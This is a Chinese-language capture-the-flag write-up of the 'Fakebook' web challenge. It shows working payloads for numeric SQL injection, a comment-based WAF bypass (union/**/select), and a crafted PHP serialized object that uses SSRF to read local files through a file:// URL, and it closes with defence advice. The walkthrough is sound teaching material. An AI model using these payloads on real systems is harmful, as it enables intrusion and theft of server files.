---
title: "[网鼎杯 2018]Fakebook"
tags:
  - CTF
  - WEB
  - SQL注入
  - SSRF
  - PHP反序列化
  - WAF绕过
created: 2026-05-13
categories:
  - BUUCTF
  - WEB
---

## 题目信息

- **URL**: `http://43f7c8e3-80d4-4646-a309-f4c9abcc7012.node5.buuoj.cn:81/`
- **类型**: WEB
- **考点**: SQL 注入（UNION 注入） + SSRF（file:// 协议读文件） + PHP 反序列化 + WAF 绕过

## 信息收集

### 首页

标题 "Fakebook"，仿 Facebook 社交平台，功能点：
- `login.php` / `join.php` — 登录/注册
- 首页展示用户列表（username, age, blog）

HTTP 头关键信息：`Server: openresty`、`X-Powered-By: PHP/5.6.40`

### robots.txt 泄露源码

访问 `/robots.txt`：

```
User-agent: *
Disallow: /user.php.bak
```

下载 `/user.php.bak` 获得核心代码：

```php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);
        return $output;
    }

    public function getBlogContents()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i", $blog);
    }
}
```

### view.php 探测

**不带 `no` 参数直接访问 `/view.php`**，直接爆错暴露路径：

```
Notice: Undefined index: no in /var/www/html/view.php on line 24
You have an error in your SQL syntax... near '' at line 1
```

确认：数据库 **MariaDB**，`no` 参数直接拼接到 SQL → **数字型 SQL 注入**。

## 漏洞分析

### SQL 注入

`view.php` 直接拼接 `$_GET['no']`：

```sql
SELECT * FROM users WHERE no = $no
```

表结构 4 列：`no`, `username`, `passwd`, `data`。`data` 列存储序列化 `UserInfo` 对象，`view.php` 对其 `unserialize()` 后调用 `getBlogContents()` 抓取 blog URL。

### SSRF

`UserInfo::get($url)` 使用 `curl_exec()`，**未限制协议**。注册时 `isValidBlog()` 限制只能 `http(s)://`，但通过 SQL 注入构造的 data 不经此验证，可直接 `file://` 读本地文件。

### WAF 绕过

`union` + `select` 连在一起被过滤，用注释分隔即可绕过：

| Payload | 结果 |
|---------|------|
| `union select` | 拦截（no hack ~_~） |
| `union/**/select` | **绕过** ✅ |

### 为什么不需要 CONCAT(CHAR())

PHP 序列化格式使用 `"` 双引号，包裹在 SQL **单引号** `'...'` 中不会被转义。直接拼进去即可。

> 以前的 WP 用 `CONCAT(CHAR(...))` 是过度复杂化了——那是为了绕过 `magic_quotes_gpc` 对单引号的转义，但这题序列化字符串里根本没有单引号。

## 漏洞利用（三步拿 Flag）

### Step 1：测列数

```
view.php?no=1 order by 4     → 正常
view.php?no=1 order by 5     → 报错 → 4 列
```

### Step 2：构造序列化 Payload

把 `blog` 属性改成 `file:///var/www/html/flag.php`，**注意修改字符串长度**：

原始序列化（blog 是正常 URL 时，长度 22）：
```
O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:22:"https://www.baidu.com/";}
```

修改后（`file:///var/www/html/flag.php` 长度 **29**）：
```
O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
```

### Step 3：注入并获取 Flag

```
view.php?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

查看页面源码，`<iframe>` 中嵌入了 flag 文件的 base64 编码：

```html
<iframe src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tmMWU5ZDlmOS04YmQ4LTQ5YTMtOWZmOC0xYzlkOGZjMzNiYTl9IjsNCmV4aXQoMCk7DQo='>
```

base64 解码：

```php
<?php

$flag = "flag{f1e9d9f9-8bd8-49a3-9ff8-1c9d8fc33ba9}";
exit(0);
```

## 获取 Flag

```
flag{f1e9d9f9-8bd8-49a3-9ff8-1c9d8fc33ba9}
```

## 攻击链路总结

```
robots.txt → user.php.bak 源码泄露
    ↓
curl_exec 无协议限制 → SSRF 可行
    ↓
view.php?no= SQL 注入 → order by 测列数 = 4
    ↓
union/**/select 绕过 WAF
    ↓
第 4 列注入序列化 UserInfo（blog = file:///var/www/html/flag.php）
    ↓                               ↑ 注意修正字符串长度！
getBlogContents() → curl_exec(file://) → SSRF 读 flag
```

## 知识点总结

- **信息泄露**：robots.txt 暴露备份文件 → `.bak` 源码审计
- **SQL 注入**：数字型 `order by` + `union select`
- **WAF 绕过**：`union/**/select` 内联注释绕过
- **PHP 反序列化**：手工修改序列化字符串控制对象属性，**关键：修改字符串值后必须修正长度前缀 `s:N:`**
- **SSRF**：curl 无协议限制，`file://` 读本地文件

## 防御建议

1. SQL 使用参数化查询（Prepared Statements）
2. curl 白名单限制协议，禁用 `file://`
3. 不要将 `.bak` 等备份文件放在 Web 可访问目录
4. 反序列化前验证数据完整性，或使用 JSON
5. 关闭 PHP 错误回显
